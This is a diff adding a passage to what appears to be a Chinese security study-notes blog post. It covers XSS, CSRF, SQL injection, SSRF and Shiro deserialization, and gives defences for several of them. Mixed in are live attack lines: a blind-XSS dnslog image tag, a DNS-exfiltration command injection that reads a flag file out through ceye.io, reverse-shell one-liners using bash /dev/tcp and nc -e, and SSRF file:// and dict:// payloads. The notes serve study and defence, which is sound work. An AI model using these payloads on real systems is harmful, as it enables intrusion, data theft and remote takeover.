@@ -342,6 +342,112 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc</span><br><span class="line">Windows设置		脚本[启动/关机]	双击[启动]</span><br><span class="line">添加的脚本或者PowerShell</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_60600840/article/details/131025075">https://blog.csdn.net/qq_60600840/article/details/131025075</a></p>
+<h1 id="xss无回显"><a href="#xss无回显" class="headerlink" title="xss无回显"></a>xss无回显</h1><p>一般xss漏洞的判断标准时弹框，但这个没回显判断不出没有xss，</p>
+<p>这个时候用xss盲打来进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://xss.t7y3wc.dnslog.cn&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/04/18/%E6%8A%A4%E7%BD%91%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/5.png" alt="护网基本问题"></p>
+<p>我们可以用dnslog来验证，src时上传的参数时地区域名</p>
+<p>如果他会解析参数</p>
+<p>这里就会出现，dns query看到就会出现信息</p>
+<p><img src="/2024/04/18/%E6%8A%A4%E7%BD%91%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/6.png" alt="护网基本问题"></p>
+<p>证明了有xss漏洞</p>
+<h5 id="alert-document-cookie"><a href="#alert-document-cookie" class="headerlink" title="alert(document.cookie)"></a>alert(document.cookie)</h5><h1 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h1><p>1</p>
+<p>ls &gt; 1.txt</p>
+<p>访问即可</p>
+<p>2。dnslog外带数据法</p>
+<p>看到这个ping命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&quot;where_is_flag.php&quot;);</span><br><span class="line">echo &quot;ping&quot;;</span><br><span class="line">$ip =(string)$_GET[&#x27;ping&#x27;];</span><br><span class="line">$ip =str_replace(&quot;&gt;&quot;,&quot;0.0&quot;,$ip);</span><br><span class="line">system(&quot;ping  &quot;.$ip);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ping `cat where_is_flag.php|sed s/[[:space:]]/xx/g`.******.ceye.io</span><br><span class="line"># 因为域名中不允许有空格，但是php代码中可能会含有空格，所以使用sed命令将php代码的空格替换为xx</span><br><span class="line">s是替换</span><br><span class="line">g是整个输入文本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.90/?ping=`cat where_is_flag.php|sed s/[[:space:]]/xx/g`.******.ceye.io</span><br></pre></td></tr></table></figure>
+
+<p>可以在dns query看到where_is_flag.php内容</p>
+<p>3反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406672.html">https://www.cnblogs.com/pursue-security/p/15406672.html</a></p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</p>
+<p>nc -e &#x2F;bin&#x2F;sh ip port</p>
+<h1 id="Apache-Shiro反序列化漏洞：-Shiro-rememberMe（Shiro-550）、Shiro-Padding-Oracle"><a href="#Apache-Shiro反序列化漏洞：-Shiro-rememberMe（Shiro-550）、Shiro-Padding-Oracle" class="headerlink" title="Apache Shiro反序列化漏洞： Shiro rememberMe（Shiro-550）、Shiro Padding Oracle"></a>Apache Shiro反序列化漏洞： Shiro rememberMe（Shiro-550）、Shiro Padding Oracle</h1><h1 id="Attack-Shiro-721-550与721的区别"><a href="#Attack-Shiro-721-550与721的区别" class="headerlink" title="Attack(Shiro-721)550与721的区别"></a>Attack(Shiro-721)550与721的区别</h1><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>Apache Shiro框架进行登录，服务端在接收cookie时，会经过下面的流程：</p>
+<p>1、检索RememberMe Cookie的值</p>
+<p>2、Base64解码</p>
+<p>3、AES解密（加密密钥硬编码）</p>
+<p>4、进行反序列化操作（未过滤处理）</p>
+<p>5、攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令</p>
+<h4 id="主要区别"><a href="#主要区别" class="headerlink" title="主要区别"></a>主要区别</h4><p>Shiro550使用已知<code>密钥碰撞</code>，只要有足够密钥库（条件较低），不需要Rememberme Cookie</p>
+<p>Shiro721的aes加密的key基本猜不到，系统随机生成,需要利用有效的rememberMe Cookie去爆破key，来构造RememberMe Cookie 值,来实现反序列化漏洞攻击</p>
+<h3 id="版本问题"><a href="#版本问题" class="headerlink" title="版本问题"></a>版本问题</h3><p>1、Shiro框架1.2.4版本之前的登录时默认是先验证”rememberMe” Cookie的值，而不是先进行身份验证，这也是Shiro550漏洞能够利用的原因之一，攻击者可以利用该漏洞通过伪造”rememberMe” Cookie的值来绕过Shiro框架的身份认证机制，从而实现未授权访问</p>
+<p>2、Shiro框架1.2.4版本之后的登录时先进行身份验证，而不是先验证”rememberMe” Cookie的值，所以攻击者需要知道受害者已经通过登录验证，并且Shiro框架已经为受害者创建了一个有效的会话，以便攻击者可以利用该会话ID进行身份伪造并绕过Shiro框架的权限控制机制</p>
+<p>3、同时，Shiro框架的登录流程也是可以自定义的<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55793759/article/details/129398462">https://blog.csdn.net/m0_55793759/article/details/129398462</a></p>
+<h1 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h1><p>程序员没有遵循代码与数据分离原则，使用户数据作为代码执行。</p>
+<p>sql注入的利用，使用联合查询，报错注入，二次注入，盲注，堆叠注入，宽字节注入的方式在数据库中获取敏感信息</p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="1-严格的数据类型"><a href="#1-严格的数据类型" class="headerlink" title="1.严格的数据类型"></a>1.严格的数据类型</h2><p>在传入参数的地方限制参数的类型，比如整型 Integer，随后加入函数判断，如is_numeric($_GET[‘id’]) 只有当 get 到的 id 为数字或者数字字符时才能执行下一步。但这种方法存在一定的限制，只能在特定的页面才能使用，一般大部分都是要求我们传入的字符串，但可以很大程度限制整型注入的情况。</p>
+<h2 id="2-特殊字符转义"><a href="#2-特殊字符转义" class="headerlink" title="2.特殊字符转义"></a>2.特殊字符转义</h2><p>数字型注入可以通过检查数据类型防御，字符型则需要对特殊字符进行转义。在 MySQL 中我们需要对” ‘进行转义，这样可以防止恶意攻击者来闭合语句。我们通常使用 addslashes() 等安全函数来转义特殊字符。</p>
+<h2 id="3-使用预编译语句"><a href="#3-使用预编译语句" class="headerlink" title="3.使用预编译语句"></a>3.使用预编译语句</h2><p>当一条 SQL 语句执行前，需要先进行语法分析。如果没有使用预编译的方法来执行 SQL，那么每次在执行 SQL 时都需要先进行语法分析，然后再执行。此时进行 SQL 注入，恶意的代码(payload)拼接上 SQL 语句之后才会进行语法分析，其中 payload 中包含的关键字等内容便会被识别，因此会被成功执行。</p>
+<p>而预编译则是先在待传入参数的位置增加占位符(?)，并对 SQL 语句进行语法分析和编译，并将结果存入内存中等待调用。在调用时，传入的参数会自动放入占位符的位置，并执行 SQL 语句。此时如果进行注入，由于并没有重新进行语法分析，payload 中包含的关键字等不会被识别，而是作为字符串的形式存在于语句中，因此 payload 不会成为 SQL 语句的一部分。</p>
+<p><strong>预编译可以防止 sql 注入的原因</strong>：允许数据库做参数化查询。在使用参数化查询的情况下，数据库不会将参数的内容视为 SQL 执行的一部分，而是作为一个字段的属性值来处理，这样就算参数中包含破环性语句（or ‘1&#x3D;1’）也不会被执行。</p>
+<h1 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h1><p>extractvalue</p>
+<p>updatexml</p>
+<p>floor()</p>
+<h1 id="XSS如何绕过HttpOnly获取Cookie"><a href="#XSS如何绕过HttpOnly获取Cookie" class="headerlink" title="XSS如何绕过HttpOnly获取Cookie"></a>XSS如何绕过HttpOnly获取Cookie</h1><p>利用phpinfo获取cookie</p>
+<p>Apache漏洞获取cookie</p>
+<p>XSS与CORS漏洞利用</p>
+<h1 id="安全设备"><a href="#安全设备" class="headerlink" title="安全设备"></a>安全设备</h1><p>天眼</p>
+<p>椒图</p>
+<p>奇安信的edr（终端安全响应系统）</p>
+<p>奇安信的ids（入侵检测系统 ）</p>
+<p>长亭的蜜罐谛听</p>
+<p>青藤云的IDS</p>
+<p>深信服的IDS、IPS(入侵防御系统 )</p>
+<h1 id="ssrf（服务器请求伪造）"><a href="#ssrf（服务器请求伪造）" class="headerlink" title="ssrf（服务器请求伪造）"></a>ssrf（服务器请求伪造）</h1><p>利用服务端的有代理请求功能，服务器根据用户输入，再服务器端构造一个url，并向其发送一个请求，通过访问其他的服务端资源来完成正常的页面展示，但用户提交的url是操作内网的敏感资源，可能会修改服务器的状态，造成提权，或泄密</p>
+<p>url伪协议</p>
+<p>用file协议去获取文件内容url&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini</p>
+<p>dict字典服务器协议；dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info(检测端口)</p>
+<p>tftp简单文件传输协议</p>
+<p>gopher:&#x2F;&#x2F;分布式文档传递服务</p>
+<p>redis的默认端口6379</p>
+<h1 id="态势感知如何验证文件上传漏洞的真假"><a href="#态势感知如何验证文件上传漏洞的真假" class="headerlink" title="态势感知如何验证文件上传漏洞的真假"></a>态势感知如何验证文件上传漏洞的真假</h1><p>通过态势感知系统，你可以监控网络流量和服务器日志如果发现与文件上传相关的异常活动，那么可能需要进一步调查是否存在文件上传漏洞。</p>
+<h1 id="端口异常"><a href="#端口异常" class="headerlink" title="端口异常"></a>端口异常</h1><p>1</p>
+<p>netstat -ano  查看端口对应的进程号</p>
+<p>2</p>
+<p>tasklist | findstr “进程号”</p>
+<p>3</p>
+<p>taskkill &#x2F;f &#x2F;t &#x2F;in “应用名称”</p>
+<h1 id="csrf（跨站请求伪造）"><a href="#csrf（跨站请求伪造）" class="headerlink" title="csrf（跨站请求伪造）"></a>csrf（跨站请求伪造）</h1><p>csrf是借助用户之手去发布恶意请求</p>
+<h3 id="CSRF-GET："><a href="#CSRF-GET：" class="headerlink" title="CSRF GET："></a><strong>CSRF GET：</strong></h3><ol>
+<li>Bob 创建了含有 GET 请求的恶意链接</li>
+<li>Bob 通过聊天工具、邮件或网站传播恶意链接</li>
+<li>Alice 点击了恶意链接</li>
+<li>以 Alice 的身份发起了 GET 请求</li>
+<li>服务端以 Alice 认证的 Cookie 来处理请求</li>
+<li>服务端按照 Alice 的身份更新了状态（Alice 并不知情）</li>
+</ol>
+<h3 id="CSRF-POST："><a href="#CSRF-POST：" class="headerlink" title="CSRF POST："></a><strong>CSRF POST：</strong></h3><ol>
+<li>Bob 创建了恶意网页</li>
+<li>Bob 传播该网页</li>
+<li>Alice 点击恶意网页并提交了表单（可能有填写动作、也可能是自动提交）</li>
+<li>表单发起提交到另一个站点的 POST 请求</li>
+<li>服务端以 Alice 身份处理 POST 请求</li>
+<li>服务端状态已改变</li>
+</ol>
+<h4 id="csrf如何防御–cookie设置httpOnly-token验证-隐藏令牌-Referer验证"><a href="#csrf如何防御–cookie设置httpOnly-token验证-隐藏令牌-Referer验证" class="headerlink" title="csrf如何防御–cookie设置httpOnly+token验证+隐藏令牌+Referer验证"></a>csrf如何防御–cookie设置httpOnly+token验证+隐藏令牌+Referer验证</h4><p>（1）csrf利用浏览器的cookie，为了防止xss盗用cookie，在cookie中设置httponly属性，通过程序（javasc脚本，applet等）无法读取cookie信息，避免伪造cookie</p>
+<p>设httponly</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &quot;Set-Cookie&quot;, &quot;cookiename=cookievalue;HttpOnly&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>(2)token验证</p>
+<p>服务器发送给客户端一个token，客户端的表单带这个token（不能从cookie获取）</p>
+<p>如果是post方式，在相应表单中增加一个隐藏域，<input type="hidden" name="_toicen" value="tokenvalue"/>，token也是通过服务器生成，表单提交的token值通过post请求域参数带到服务端，会话带相同token，会话过期token失效</p>
+<p>（3）隐藏令牌：把token隐藏带head头中</p>
+<p>（4）referer验证：只接受本站的请求</p>
+<h4 id="1、XSS的基本概念：XSS（Cross-Site-Scripting）：跨域脚本攻击。"><a href="#1、XSS的基本概念：XSS（Cross-Site-Scripting）：跨域脚本攻击。" class="headerlink" title="1、XSS的基本概念：XSS（Cross Site Scripting）：跨域脚本攻击。"></a>1、XSS的基本概念：XSS（Cross Site Scripting）：跨域脚本攻击。</h4><p>2、XSS攻击原理：不需要你做任何的登录认证，它会通过合法的操作（比如在url中输入、在评论框中输入），向你的页面注入脚本（可能是js、html代码块等）。</p>
+<p>3、XSS攻击后果：盗用Cookie破坏页面的正常结构，插入广告等恶意内容D-doss攻击</p>
+<p>4、XSS的攻击方式<br>a. 反射型：发出请求时，XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以叫反射型XSS。<br>b.存储型：存储型XSS和反射型XSS的差别在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求时目标页面时不用再提交XSS代码。</p>
+<h1 id="xss防御"><a href="#xss防御" class="headerlink" title="xss防御"></a>xss防御</h1><p>XSS的防范措施主要有三个：编码、过滤、校正<br>1、编码：对用户输入的数据进行HTML Entity 编码。把字符转换成 转义字符。Encode的作用是将$var等一些字符进行转化，使得浏览器在最终输出结果上是一样的。<br>比如说这段代码：<script>alert(1)</script><br>若不进行任何处理，则浏览器会执行alert的js操作，实现XSS注入。进行编码处理之后，L在浏览器中的显示结果就是这个文本，将变量作为纯文本进行输出，且不引起JavaScript的执行。</p>
+<p>2、过滤：移除用户输入的和事件相关的属性。如onerror可以自动触发攻击，还有onclick等。（总而言是，过滤掉一些不安全的内容）移除用户输入的Style节点、Script节点、Iframe节点。（尤其是Script节点，它可是支持跨域的呀，一定要移除）。</p>
+<p>3、校正：避免直接对HTML Entity进行解码。使用DOM Parse转换，校正不配对的DOM标签。(DOM Parse：它的作用是把文本解析成DOM结构)<br>常见2种方法：a.第一步的编码转成文本，然后第三步转成DOM对象，然后经过第二步的过滤。 b.还有一种更简洁：首先是encode，如果是文本，就白名单。</p>
+<h1 id="CSRF-和-XSS-的区别"><a href="#CSRF-和-XSS-的区别" class="headerlink" title="CSRF 和 XSS 的区别"></a>CSRF 和 XSS 的区别</h1><p>1.csrf是跨站请求伪造；xss是跨域脚本攻击</p>
+<p>2.csrf需要用户先登录网站a，获取cookie；xss不需要登录</p>
+<p>3.csrf是利用网站a本身的漏洞，去请求网站a的api；xss是向网站a注入js代码，然后执行js代码，篡改网站a的内容。（xss利用站点信任用户，csrf则是通过伪装来自信任用户的请求来利用网站即攻击者盗用你的身份，以你的名义向第三方网站发送恶意请求）</p>
 
                     </div>
 </div>
